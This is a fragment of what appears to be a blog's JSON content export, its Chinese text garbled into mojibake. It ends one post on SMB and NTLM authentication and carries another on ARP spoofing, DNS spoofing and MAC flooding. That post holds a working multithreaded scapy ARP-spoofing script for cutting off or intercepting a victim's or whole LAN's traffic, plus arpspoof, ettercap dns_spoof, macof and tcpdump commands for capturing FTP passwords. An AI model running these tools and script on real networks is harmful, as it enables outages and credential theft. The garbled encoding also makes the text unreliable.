1.3è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼Œæ­¤æ—¶æœåŠ¡å™¨åªæ˜¯é€‰ä¸­äº†SMB2ï¼Œä½†æ˜¯SMB2ä¹Ÿåˆ†äº†å¾ˆå¤šç‰ˆæœ¬ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯è¿˜ä¼šåŸºäºSMB2ç»§ç»­è¿›è¡Œç‰ˆæœ¬é—®è¯¢ ç„¶åæœåŠ¡å™¨å†ç»§ç»­é€‰æ‹©ä¸€ä¸ªç»†åˆ†ç‰ˆæœ¬ï¼Œç‰ˆæœ¬åå•†ç»“æŸ 2.1 å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯æä¾›ç”¨æˆ·ä¿¡æ¯ã€‚SMBåè®®çš„è¿™ä¸€ä¸ªéƒ¨åˆ†ä½¿ç”¨NTLMåè®®å®Œæˆçš„ã€‚å»ºè®®å…ˆçœ‹çœ‹NTLMè®¤è¯å†è¿‡æ¥é¦–å…ˆå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªè¯·æ±‚NTLMè®¤è¯çš„åŒ… 2.2æœåŠ¡ç«¯è¿”å›challenge 2.3 å®¢æˆ·ç«¯å‘é€ç”¨æˆ·åï¼Œè¢«client hashåŠ å¯†çš„challengeï¼ˆNTLM RESPONSEï¼‰ç»™æœåŠ¡ç«¯ 2.4æœåŠ¡ç«¯è¿›è¡Œè®¤è¯å¤„ç†ï¼Œè¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸‹å›¾æ˜¯æˆåŠŸæ—¶ï¼Œè¿”å› ä¼šè¯å»ºç«‹å­—æ · 3.1å®¢æˆ·ç«¯å‘é€è¯·æ±‚çš„èµ„æº 3.2æœåŠ¡ç«¯è¿”å›å…è®¸æˆ–æ‹’ç» å„ç§è¯»å†™æ“ä½œè¯·æ±‚","categories":[],"tags":[{"name":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","slug":"å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ","permalink":"http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}]},{"title":"ARPæ¬ºéª—&DNSæ¬ºéª—&macæ³›æ´ªæ”»å‡»","slug":"ARPæ¬ºéª—&DNSæ¬ºéª—&macæ³›æ´ªæ”»å‡»","date":"2021-06-28T13:51:58.218Z","updated":"2021-06-28T13:38:48.019Z","comments":true,"path":"2021/06/28/ARPæ¬ºéª—&DNSæ¬ºéª—&macæ³›æ´ªæ”»å‡»/","link":"","permalink":"http://const27.com/2021/06/28/ARP%E6%AC%BA%E9%AA%97&DNS%E6%AC%BA%E9%AA%97&mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/","excerpt":"","text":"arpåè®®ä¸æ¬ºéª—ç®€å•æ¦‚è¦ï¼šé€šè¿‡æ­¤åè®®æ¥è·å–å±€åŸŸç½‘ä¸­æŸIPåœ°å€çš„macåœ°å€ ä½œç”¨ï¼šåœ¨å±€åŸŸç½‘ä¸­çš„æœºå™¨äº’ç›¸å‘é€æ¶ˆæ¯æ—¶ï¼Œé çš„æ˜¯macåœ°å€ï¼ˆä¹Ÿå«ä»¥å¤ªç½‘åœ°å€ï¼‰æ¥ç¡®å®šç›®çš„åœ°å€çš„ï¼Œè€Œæˆ‘ä»¬åªçŸ¥é“IPåœ°å€ï¼Œæ‰€ä»¥éœ€è¦arpåè®®æ¥æŠŠipåœ°å€æ˜ å°„ä¸ºmacåœ°å€ã€‚ å…·ä½“å®ç°åŸç†æ˜¯ï¼Œæ¯”å¦‚æˆ‘æƒ³çŸ¥é“192.168.1.1çš„macåœ°å€ï¼Œå°±ä¼šåœ¨å¹¿æ’­åŸŸé‡Œå¹¿æ’­arpè¯·æ±‚ï¼Œipä¸æ˜¯192.168.1.1çš„ä¸»æœºä¼šè‡ªåŠ¨å¿½ç•¥è¯·æ±‚ï¼Œè€Œ192.168.1.1ä¸»æœºåˆ™ä¼šåº”ç­”è¯·æ±‚ï¼Œå¹¶è¿”å›è‡ªå·±çš„macåœ°å€(ç”±IPå®šä½åˆ°macåœ°å€) arpé«˜é€Ÿç¼“å­˜è¡¨ï¼šè¿™ä¸ªè¡¨ç”¨æ¥ç¼“å­˜ ipåœ°å€ä¸macåœ°å€ çš„å¯¹åº”å…³ç³»æœ‰åŠ¨æ€è¡¨å’Œé™æ€è¡¨ï¼š åŠ¨æ€è¡¨éšæ—¶é—´çš„æ¨ç§»è‡ªåŠ¨æ·»åŠ å’Œåˆ é™¤,æ¯ä¸ªåŠ¨æ€arpç¼“å­˜éƒ½æœ‰è‡ªå·±çš„TTL(ç”Ÿå­˜æ—¶é—´).TTLä¸º0å°±ä¼šè¢«åˆ é™æ€è¡¨æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ‰‹åŠ¨æ·»åŠ å’Œåˆ é™¤ã€‚ å±€åŸŸç½‘ä¸­ipåˆ°macåœ°å€è§£æè¿‡ç¨‹ï¼š1.å½“ç¼“å­˜è¡¨ä¸­å­˜åœ¨ç›®çš„IPå¯¹åº”çš„macåœ°å€æ—¶ åˆ™ç›´æ¥è¿”å›ä¸IPå¯¹åº”çš„macåœ°å€2.å½“ç¼“å­˜è¡¨ä¸­æ²¡æœ‰å¯¹åº”å…³ç³»æ—¶,åˆ™å‘å±€åŸŸç½‘ä¸­å‘é€arpå¹¿æ’­è¯·æ±‚ç›®çš„IPçš„macï¼Œæ”¶åˆ°arpåº”ç­”åå°†å¯¹åº”å…³ç³»è®°å½•åˆ°é«˜é€Ÿç¼“å­˜è¡¨ä¸­é«˜é€Ÿç¼“å­˜è¡¨çš„ä¼˜ç¼ºç‚¹ï¼šä¼˜ç‚¹ï¼šå‡å°‘ç½‘ç»œé€šä¿¡é‡ï¼Œæé«˜é€šä¿¡æ•ˆç‡ç¼ºç‚¹ï¼šä¼šé€ æˆå®‰å…¨éšæ‚£ arpåˆ†ç»„æ ¼å¼ 1.arpè¯·æ±‚çš„ç›®çš„macåœ°å€ å…¨fæ—¶ä»£è¡¨å¹¿æ’­åœ°å€2.arpè¯·æ±‚çš„æ¥æºmacåœ°å€3.å­—æ®µ3 ä»¥å¤ªç½‘å¸§ç±»å‹è¡¨ç¤ºçš„æ˜¯åé¢çš„æ•°æ®ç±»å‹ï¼ŒARPè¯·æ±‚å’ŒARPåº”ç­”è¿™ä¸ªå€¼ä¸º0x08064.å­—æ®µ4 è¡¨ç¤ºç¡¬ä»¶åœ°å€çš„ç±»å‹ï¼Œç¡¬ä»¶åœ°å€ä¸åªä»¥å¤ªç½‘ä¸€ç§ï¼Œæ˜¯ä»¥å¤ªç½‘ç±»å‹æ—¶æ­¤å€¼ä¸º15.å­—æ®µ5 è¡¨ç¤ºè¦æ˜ å°„çš„åè®®åœ°å€çš„ç±»å‹ï¼Œè¦å¯¹IPv4åœ°å€è¿›è¡Œæ˜ å°„ï¼Œæ­¤å€¼ä¸º0x080067.å­—æ®µ6å’Œ7 è¡¨ç¤ºç¡¬ä»¶åœ°å€é•¿åº¦å’Œåè®®åœ°å€é•¿åº¦ï¼ŒMACåœ°å€å 6å­—èŠ‚ï¼ŒIPåœ°å€å 4å­—èŠ‚8.æ“ä½œç±»å‹å­—æ®µï¼Œå€¼ä¸º1ï¼Œè¡¨ç¤ºè¿›è¡ŒARPè¯·æ±‚ï¼›å€¼ä¸º2ï¼Œè¡¨ç¤ºè¿›è¡ŒARPåº”ç­”ï¼› å€¼ä¸º3ï¼Œè¡¨ç¤ºè¿›è¡ŒRARPè¯·æ±‚ï¼›å€¼ä¸º4ï¼Œè¡¨ç¤ºè¿›è¡ŒRARPåº”ç­”ã€‚ï¼ˆé‡è¦ï¼‰9.å­—æ®µ9 å‘é€ç«¯ARPè¯·æ±‚æˆ–åº”ç­”çš„ç¡¬ä»¶åœ°å€ï¼Œè¿™é‡Œæ˜¯ä»¥å¤ªç½‘åœ°å€ï¼Œå’Œå­—æ®µ2ç›¸åŒã€‚10.å­—æ®µ10 å‘é€ARPè¯·æ±‚æˆ–åº”ç­”çš„IPåœ°å€ã€‚11 12.ç›®çš„ç«¯çš„ç¡¬ä»¶åœ°å€å’Œåè®®åœ°å€ å…è´¹arpå…è´¹arpæ˜¯æŒ‡ä¸»æœºå‘é€arpæŸ¥æ‰¾è‡ªå·±çš„IPåœ°å€,å‘é€ç«¯çš„åè®®åœ°å€å’Œç›®çš„ç«¯çš„åè®®åœ°å€æ˜¯ä¸€è‡´çš„ä½œç”¨ï¼š (å¦‚æŸäº›ç½‘å…³è®¾å¤‡ä¼šæ¯éš”ä¸€å®šæ—¶é—´å¹¿æ’­ä¸€æ¬¡å…è´¹arpï¼Œè®©ç½‘ç»œä¸­å…¶ä»–ä¸»æœºæ›´æ–°arpç¼“å­˜è¡¨ä¸­ç½‘å…³çš„macåœ°å€ï¼Œç¼“è§£arpæ”»å‡»æ•ˆæœ)(å¦‚é»‘å®¢å¯ä»¥ä½¿ç”¨å…è´¹arpï¼Œå°†è™šå‡ä¼ªé€ çš„ ip macå¯¹åº”å…³ç³»é€šè¿‡arpå¹¿æ’­å‡ºå»ï¼Œä½¿ç½‘ç»œä¸­å…¶ä»–ä¸»æœºæ›´æ–°arpç¼“å­˜è¡¨ï¼Œæ›´æ–°å®Œæˆåï¼Œè¿™äº›ä¸»æœºçš„æ•°æ®ä¼šè½¬å‘åˆ°é”™è¯¯çš„macåœ°å€ï¼Œä»è€Œå®ç°arpæ¬ºéª—ï¼‰2.æ£€æŸ¥å¹¿æ’­åŸŸé‡Œçš„å…¶ä»–ä¸»æœºæœ‰æ²¡æœ‰ä½¿ç”¨è‡ªå·±çš„IPï¼Œå¦‚æœä½¿ç”¨äº†ï¼Œåˆ™ä¼šå¼¹å‡º IPå†²çª å­—æ ·å…è´¹arpä¸æ™®é€šarpçš„åŒºåˆ«:æ™®é€šarpçš„è¯·æ±‚æ˜¯ æˆ‘éœ€è¦æŸipçš„macåœ°å€ï¼Œè¯¥IPæ˜¯å…¶ä»–æœºå™¨çš„IPåœ°å€å…è´¹arpçš„è¯·æ±‚æ˜¯ æˆ‘éœ€è¦æŸIPçš„macåœ°å€ï¼Œè¯¥IPæ˜¯æœºå™¨è‡ªå·±çš„IPåœ°å€ï¼Œèµ·åˆ°å®£å‘Šä½œç”¨ï¼Œå‘å‡ºå»åæ˜¯ä¸å¸Œæœ›å¾—åˆ°å›åº”çš„ï¼Œè‹¥æœ‰å›åº”åˆ™è¯´æ˜äº†IPå†²çªäº† ä»£ç†arpä»£ç†arpçš„æ„æ€æ˜¯ï¼Œä¸€ä¸ªä¸»æœºæŠŠè‡ªå·±çš„macåœ°å€ç»™å¦ä¸€å°æœºå™¨ä½¿ç”¨æ¥åº”ç­”å…¶ä»–ä¸»æœºçš„arpè¯·æ±‚ã€‚ å®é™…ä¸Šï¼Œè¿™å·²ç»æ˜¯æŸç§æ„ä¹‰ä¸Šçš„arpæ¬ºéª— arpæ”»å‡»æ”»å‡»åŸç†ï¼šarpæ”»å‡»å°±æ˜¯ä¼ªé€ IPä¸macçš„å¯¹åº”å…³ç³»æ¥å®ç°arpæ¬ºéª—ï¼Œæ”»å‡»è€…åªè¦æŒç»­ä¸æ–­çš„å‘é€ä¼ªé€ çš„arpå“åº”åŒ…å°±èƒ½æ›´æ”¹ç›®æ ‡ä¸»æœºçš„arpç¼“å­˜è¡¨ï¼Œé€ æˆ æ–­ç½‘æ”»å‡» æˆ– ä¸­é—´äººæ”»å‡» åˆ©ç”¨arspoofå®ç°æ–­ç½‘æ”»å‡»ç”¨kaliå’Œç‰©ç†æœºè¿›è¡Œæµ‹è¯•ï¼Œkaliæ˜¯æ”»å‡»æœºï¼Œç‰©ç†æœºæ˜¯å—å®³è€…é¦–å…ˆæ”¶é›†kaliï¼Œç‰©ç†æœºï¼Œç½‘å…³çš„ipåœ°å€å’Œmac å‡è®¾æˆ‘ä»¬æƒ³è¦åœ¨å®é™…ä¸­å®æ–½æ”»å‡»ï¼Œé¦–å…ˆéœ€è¦æ‰«æå±€åŸŸç½‘ä¸­çš„IPï¼Œä½†æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªpingå°±å¾ˆæµªè´¹æ—¶é—´äº†ï¼Œæ‰€ä»¥éœ€è¦fpingå‘½ä»¤è§£è¯»ä¸€ä¸‹å‘½ä»¤ arpspoof -i kaliç½‘å¡å -t è¢«æ”»å‡»æœºip ç½‘å…³å¥½çš„ï¼Œæˆ‘ä»¬ç‰©ç†æœºæˆåŠŸè¢«æ–­ç½‘ ä½¿ç”¨arpspoofå·¥å…·å’Œdriftnetå·¥å…·æ¥æˆªè·å›¾ç‰‡ï¼Œwiresharkæ¥ç›´æ¥æŠ“åŒ…ç„¶åæˆ‘ä»¬æ‰§è¡ŒarpspoogæŒ‡ä»¤æ­¤æ—¶æˆ‘ä»¬ç‰©ç†æœºå°±èƒ½è¿ä¸Šå¤–ç½‘äº†å‘ç‚¹:å¼€å¯ipè½¬å‘åç‰©ç†æœºä¾æ—§ä¸èƒ½è¿ä¸Šå¤–ç½‘. æˆ‘çš„è§£å†³æ–¹æ³•æ˜¯é‡å¯ä¸€ä¸‹ï¼Œå†ä¿®æ”¹ä»¥ä¸‹ip_forwardæ–‡ä»¶ç„¶åç­‰ä¸€ä¼šï¼Œç‰©ç†æœºå°±å¯ä»¥è¿ä¸Šå¤–ç½‘äº†.arpæ¬ºéª—åç‰©ç†æœºç½‘å¯èƒ½ä¼šå¡ã€‚æ­¤æ—¶ï¼Œç‰©ç†æœºå‘ç»™ç½‘å…³çš„é€šä¿¡ä¿¡æ¯æˆ‘ä»¬éƒ½èƒ½è·å¾—åˆ°äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨driftnetå·¥å…·æ•è·ç‰©ç†æœºæ­£åœ¨æµè§ˆçš„å›¾ç‰‡ arpæ”»å‡»çš„è„šæœ¬ç¼–å†™ï¼šarpæ”»å‡»è„šæœ¬éœ€è¦ç”¨åˆ°scapyåº“æ¥å¸®åŠ©æˆ‘ä»¬å®Œæˆarpæ•°æ®åŒ…çš„ç¼–å†™ è®²è®²é‡Œé¢çš„ä¸€äº›å‡½æ•°(æ²¡æœ‰ç»§ç»­ç ”ç©¶scapyåº“)get_if_hwaddr(&#39;ç½‘å¡å&#39;) &#x2F;&#x2F;è·å¾—è‡ªå·±çš„macåœ°å€ï¼Œä¸€èˆ¬å¡«WLANæˆ–eth0getmacbyip(&#39;ip) &#x2F;&#x2F;è·å¾—æŸIPçš„macåœ°å€srp(....) &#x2F;&#x2F;å‘ç¬¬äºŒå±‚åŒ…å¹¶è¿”ç­‰å¾…å›åº”ï¼Œè¿”å›å€¼çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›åº”åŒ…ä½“ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æœªå›åº”åŒ…ä½“sendp(Ether(src&#x3D;a,dst&#x3D;b)&#x2F;ARP(hwsrc&#x3D;c,psrc&#x3D;d,pdst&#x3D;e,op&#x3D;f))&#x2F;&#x2F;è¿™æ˜¯arpå‘åŒ…çš„æ„é€  sendpæ˜¯å‘ç¬¬äºŒå±‚æ•°æ®åŒ…å¹¶ä¸ç­‰å¾…å›åŒ… Etheræ˜¯æ„é€ åŒ…ä½“çš„æ„æ€&#x2F;&#x2F;aä¸ºè‡ªå·±çš„macåœ°å€ bä¸ºç›®æ ‡æœºå™¨çš„macåœ°å€ï¼Œ&#x2F;&#x2F;cä¸ºå‘åŒ…çš„æ¥æºmacï¼Œdä¸ºå‘åŒ…çš„æ¥æºipï¼Œeæ˜¯ç›®æ ‡æœºå™¨çš„ipï¼Œfæ˜¯arpæ“ä½œç±»å‹å­—ç¬¦&#x2F;&#x2F;arpæ¬ºéª—çš„è¯ï¼ŒæŠŠdæ”¹æˆç½‘å…³IPå³å¯ ç½‘ä¸Šå«–çš„ipï¼Œmacæ‰«ææ¨¡å—ï¼Œè¿™ä¸€æ­¥ä¹Ÿå¯ä»¥æ‰‹åŠ¨è·å– from scapy.all import *#im_scan(&#39;192.168.1.1&#x2F;24&#39;),mac ipåœ°å€æ‰«æå‡½æ•°def im_scan(ipduan): ipscan&#x3D;ipduan try: ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;) print (list_mac) è¿™ä¸ªè„šæœ¬ä»…èƒ½æ–­ç½‘å—·,å¯ä»¥å¯¹å•ä¸ªæœºå™¨æ–­ç½‘ï¼Œä¹Ÿå¯ä»¥æ–­æ•´ä¸ªå±€åŸŸç½‘çš„ç½‘ from scapy.all import *import timeimport threadingdef im_scan(ipduan):#æ‰«æ ipscan&#x3D;ipduan try: ans,unans &#x3D; srp(Ether(dst&#x3D;&quot;FF:FF:FF:FF:FF:FF&quot;)&#x2F;ARP(pdst&#x3D;ipscan),timeout&#x3D;2,verbose&#x3D;False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac&#x3D;rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;) print (list_mac) def arp_spoof(tgt_ip,gateway_ip,iface): mmac&#x3D;get_if_hwaddr(iface) tgt_mac&#x3D;getmacbyip(tgt_ip) if tgt_ip: while 1: sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,pdst&#x3D;tgt_ip,op&#x3D;2)) else: while 1: sendp(Ether(src&#x3D;mmac,dst&#x3D;&#39;ff:ff:ff:ff:ff:ff&#39;)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;gateway_ip,op&#x3D;2))def arp_gate(tgt_ip,gateway_ip,iface): mmac&#x3D;get_if_hwaddr(iface) tgt_mac&#x3D;getmacbyip(tgt_ip) while 1: sendp(Ether(dst&#x3D;gateway_mac,src&#x3D;mmac)&#x2F;ARP(hwsrc&#x3D;mmac,psrc&#x3D;tgt_ip,pdst&#x3D;gateway_ip,op&#x3D;2))if __name__&#x3D;&#x3D;&#39;__main__&#39;: ipduan&#x3D;&#39;192.168.0.0&#x2F;24&#39; tgt_ip&#x3D;&#39;192.168.0.104&#39; #è¦æ‰“æ•´ä¸ªå±€åŸŸç½‘å°±åˆ«è®¾ç½®è¿™ä¸ªï¼Œè¦æˆªè·å¤–ç•Œå‘å¾€æœºå™¨çš„æ•°æ®è¿™ä¸ªä¹Ÿå¿…é¡»è®¾ç½® gateway_ip&#x3D;&#39;192.168.0.1&#39; iface&#x3D;&#39;WLAN&#39; threads_num&#x3D;20 print(&quot;å¦‚æœæƒ³ææ•´ä¸ªå±€åŸŸç½‘å°±åˆ«è®¾ç½®tgt_ip,è¦æˆªè·å¤–ç•Œå‘å¾€æœºå™¨çš„æ•°æ®è¿™ä¸ªå¿…é¡»è®¾ç½®&quot;) so_scan&#x3D;input(&quot;[+]è¦æ‰«æå±€åŸŸç½‘å­˜æ´»ä¸»æœºå’Œå®ƒçš„macå—[Y&#x2F;N]&quot;) if so_scan&#x3D;&#x3D;&#39;Y&#39;: im_scan(ipduan) else: so_judge&#x3D;input(&quot;[+]ä½ æ˜¯æƒ³è®©æœºå™¨çš„å‘é€çš„æ•°æ®è¢«ä½ æˆªè·Yï¼Œè¿˜æ˜¯å¤–ç•Œå‘é€ç»™æœºå™¨çš„æ•°æ®è¢«ä½ æˆªè·N[Y&#x2F;N]&quot;) if so_judge&#x3D;&#x3D;&#39;Y&#39;: try: print(&#39;å¼€å§‹æˆªèƒ¡æœºå™¨å‘é€å¾€å¤–ç•Œçš„æ•°æ®&#39;) time.sleep(3) for i in range(threads_num): t1&#x3D;threading.Thread(target&#x3D;arp_spoof,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i)) t1.start() except KeyboardInterrupt: print(&#39;[+]stopppppppp&#39;) else: if tgt_ip: try: print(&#39;å¼€å§‹æˆªèƒ¡å¤–ç•Œå‘å¾€æœºå™¨çš„æ•°æ®&#39;) time.sleep(3) for i in range(threads_num): t2&#x3D;threading.Thread(target&#x3D;arp_gate,args&#x3D;(tgt_ip,gateway_ip,iface),name&#x3D;str(i)) t2.start() except KeyboardInterrupt: print(&#39;[+]stopppppppp&#39;) else: print(&#39;è¯·è®¾ç½®tgt_ip&#39;) å¹¿æ’­æ¬ºéª—ï¼Œå—å®³æœºä¸Šçš„æŠ“åŒ…æ•ˆæœ 3cé‚£ä¸ªæ˜¯æˆ‘çš„macåœ°å€ DNSæ¬ºéª—dnså·¥ä½œåŸç†dnsï¼ˆåŸŸåç³»ç»Ÿï¼‰å°†åŸŸåå’ŒIPåœ°å€ç›¸äº’æ˜ å°„ï¼Œdnsåè®®å³åŸŸåè§£æåè®®ï¼Œç”¨æ¥å°†ç”¨æˆ·è¾“å…¥çš„åŸŸåè§£æä¸ºIPã€‚å…·ä½“ä¸€ç‚¹ï¼Œå½“ç”¨æˆ·è®¿é—®æŸä¸ªåŸŸåå¦‚www.baidu.comæ—¶ï¼Œ é¦–å…ˆå‘æœ¬åœ°dnså‘å‡ºè¯·æ±‚è‹¥æœ¬åœ°dnsç¼“å­˜è¡¨æ— è¯¥åŸŸåIPæ˜ å°„å…³ç³»ï¼Œå°±ä¼šå‘æ ¹åŸŸåæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨è¿”å›comåŸŸæœåŠ¡å™¨åœ°å€ç»™æœ¬åœ°dnsæœåŠ¡å™¨æœ¬åœ°dnsæœåŠ¡å™¨å‘comåŸŸæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼ŒcomåŸŸæœåŠ¡å™¨è¿”å›baidu.comåŸŸæœåŠ¡å™¨ç»™æœ¬åœ°dnsæœåŠ¡å™¨æœ¬åœ°dnsæœåŠ¡å™¨å‘baidu.comåŸŸæœåŠ¡å™¨å‘èµ·æŸ¥è¯¢ï¼Œbaidu.comåŸŸæœåŠ¡å™¨è¿”å›www.baidu.comåœ°å€ DNSæ¬ºéª—åŸç†åœ¨arpæ¬ºéª—åè·å–åˆ°äº†å—å®³æœºå‘èµ·çš„dnsè¯·æ±‚åŒ…ï¼Œç„¶åè¿”å›ä¸€ä¸ªè‡ªå·±æ„é€ çš„dnså“åº”åŒ…ï¼Œä¼ªé€ è‡ªå·±æƒ³è¦çš„ipåŸŸåæ˜ å°„å…³ç³»ã€‚å› ä¸ºDNSæ¬ºéª—æ˜¯å»ºç«‹åœ¨arpæ¬ºéª—åŸºç¡€ä¸Šï¼Œarpæ¬ºéª—åˆå¿…é¡»åœ¨å±€åŸŸç½‘è¿›è¡Œï¼Œæ•…DNSæ¬ºéª—ä¹Ÿåªèƒ½åœ¨å±€åŸŸç½‘è¿›è¡Œ DNSæ¬ºéª—å·¥å…·å®ç° ettercap -T -q -P dns_spoof -M arp:remote &#x2F;å—å®³è€…IP&#x2F;&#x2F;&#x2F; macæ³›æ´ªæ”»å‡»äº¤æ¢æœº:äº¤æ¢æœºï¼Œåªèƒ½åšæœ‰çº¿é“¾æ¥ï¼Œæ‰€ä»¥æ‹¿è¿™ä¸ªæ˜¯ä¸èƒ½ç”¨ä½œwifiçš„ã€‚äº¤æ¢æœºçš„ä½œç”¨æ˜¯è½¬å‘å±€åŸŸç½‘å†…ä¸¤å°æœºå™¨ä¹‹é—´çš„äº’ç›¸çš„è¯·æ±‚ï¼ˆæœ‰çº¿è¿æ¥çš„æœºå™¨ï¼‰ã€‚ äº¤æ¢æœºå…·ä½“ä¼ è¾“æ•°æ®å¸§çš„è¿‡ç¨‹ï¼š å‡è®¾ä¸»æœºAç¬¬ä¸€æ¬¡å‘ä¸»æœºBå‘é€æ•°æ®ä¸»æœºAå‘äº¤æ¢æœºå‘èµ·ä¸€ä¸ªæºmacåœ°å€ä¸ºè‡ªå·±ï¼Œç›®æ ‡macåœ°å€ä¸ºä¸»æœºBçš„æ•°æ®å¸§äº¤æ¢æœºæ”¶åˆ°åï¼Œå°†æºmacåœ°å€å’Œå…¶å¯¹åº”æ¥å£è®°å½•åˆ°macåœ°å€è¡¨ä¸­ï¼ˆmacåœ°å€è¡¨ä¸arpç¼“å­˜è¡¨æœ‰åŒºåˆ«ï¼‰äº¤æ¢æœºåœ¨è‡ªå·±çš„macåœ°å€è¡¨ä¸­æ£€æŸ¥æ˜¯å¦æœ‰ç›®æ ‡macçš„ä¿¡æ¯ï¼Œå¦‚æœæœ‰åˆ™å‘ç›®æ ‡macæ¥å£è½¬å‘æ•°æ®å¸§ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä¼šå‘æ‰€ä»¥éæ•°æ®æ¥æºæ¥å£çš„æ¥å£å¹¿æ’­è¯¥æ•°æ®å¸§ï¼ˆmacæ³›æ´ªæ”»å‡»åŸç†ï¼‰å±€åŸŸç½‘å†…ä¸»æœºéƒ½æ”¶åˆ°äº†æ­¤æ•°æ®å¸§ï¼Œä½†åªæœ‰ä¸»æœºBä¼šå“åº”è¯¥æ•°æ®å¸§å¹¶ä¸”å›åº”ï¼Œå›åº”ä¿¡æ¯é‡Œæ³¨æ˜ä¸»æœºBçš„macåœ°å€ä»¥ä¾¿è®°å½•åˆ°macåœ°å€è¡¨ï¼Œå…¶ä»–ä¸»æœºéƒ½ä¸ä¼šæœ‰ååº”ã€‚äº¤æ¢æœºæ¥æ”¶åˆ°ä¸»æœºBçš„å›åº”åï¼Œä¼šè®°å½•å…¶mac æ¥å£çš„æ˜ å°„å…³ç³»ï¼Œä»¥åABé€šä¿¡æ—¶ä¼šè°ƒç”¨macåœ°å€è¡¨ä¸­çš„è®°å½•ï¼Œå®ç°å•æ’­ macè¡¨ä¸arpç¼“å­˜è¡¨çš„åŒºåˆ«macè¡¨è®°å½•åœ¨äº¤æ¢æœºä¸­ï¼Œç”¨äºè®°å½•æ¥å£ macåœ°å€çš„å¯¹åº”å…³ç³»arpç¼“å­˜è¡¨è®°å½•åœ¨æœ¬æœºä¸­ï¼Œç”¨äºè®°å½•IP macåœ°å€çš„å¯¹åº”å…³ç³» äº¤æ¢æœºmacè¡¨çš„å­¦ä¹ æœºåˆ¶ï¼šmacè¡¨ä¸€èˆ¬éƒ½æ˜¯æœ‰å¤§å°é™åˆ¶çš„ï¼Œä¸€æ—¦macè¡¨æ»¡äº†ï¼Œå…¶ä»–macåœ°å€å°±åŠ ä¸è¿›æ¥äº†ã€‚ä¸€æ—¦å…¶ä»–macåœ°å€åŠ ä¸è¿›æ¥äº†ï¼Œé‚£ä¹ˆmacè¡¨å°±æ— æ³•è¿›ä¸€æ­¥å­¦ä¹ ï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«å¹¿æ’­åˆ°å±€åŸŸç½‘ï¼Œå®ç°æ³›æ´ªã€‚macè¡¨æ˜¯æœ‰è€åŒ–æœºåˆ¶çš„ï¼Œè‹¥äº¤æ¢æœºä¸æŸå°ä¸»æœºé•¿æ—¶é—´æœªé€šä¿¡ï¼Œäº¤æ¢æœºå°±ä¼šæŠŠè¯¥ä¸»æœºçš„macåœ°å€åˆ é™¤ï¼Œç­‰ä¸‹ä¸€æ¬¡é€šä¿¡æ—¶å†å­¦ä¹ ã€‚ æ³›æ´ªæ”»å‡»åŸç†ï¼šæ³›æ´ªæ”»å‡»çš„ç›®çš„æ˜¯è·å–ä¸»æœºä¹‹é—´çš„é€šä¿¡æ•°æ®ï¼Œè¦è¾¾åˆ°è¿™ä¸ªç›®çš„åˆ™éœ€è¦å¼ºè¿«äº¤æ¢æœºæŠŠæ¥æ”¶åˆ°çš„æ•°æ®å¸§ç»Ÿç»Ÿå¹¿æ’­å‡ºæ¥ã€‚æ³›æ´ªæ”»å‡»åŸç†åˆ™æ˜¯å‘äº¤æ¢æœºå‘é€å¤§é‡æœªçŸ¥macåœ°å€è®©äº¤æ¢æœºä¸åœå­¦ä¹ ï¼ŒæŠŠmacè¡¨å……æ»¡ï¼Œè¿™æ ·æ­£å¸¸ä¸»æœºmacåœ°å€è€åŒ–åå°±æ— æ³•å†æ·»åŠ åˆ°macåœ°å€è¡¨ä¸­ï¼Œä»¥åçš„æ‰€æœ‰é€šä¿¡æ•°æ®éƒ½ä¼šè¢«å¹¿æ’­å‡ºæ¥ ä½¿ç”¨kaliä¸Šçš„macofæ¥è¿›è¡Œæ³›æ´ªæ”»å‡»ç›®å‰æœ‰ä¸‰å°æœºå™¨æˆ‘ä»¬è¯•ç€æˆªè·ç‰©ç†æœºç™»å½•ftpæœåŠ¡å™¨æ—¶çš„è´¦æˆ·ä¸å¯†ç å…ˆä½¿ç”¨å‘½ä»¤macofï¼Œè®©äº¤æ¢æœºçš„macè¡¨è¢«å æ»¡ä»…è¾“å…¥macofå³å¯è¾“å…¥tcpdump -nn -X -i eth0 tcp port 21å¼€å§‹æŠ“åŒ…ï¼ˆå»ºè®®ä¸ç”¨wiresharkï¼Œæ˜¯å› ä¸ºåŒä¸€æ—¶é—´macofå‘½ä»¤å‘å‡ºçš„æ•°æ®åŒ…å¤ªå¤šäº†ï¼Œç”¨wiresharkä¼šå·¨å¡ï¼‰ ä¸‹é¢æ˜¯æŠ“httpåŒ… 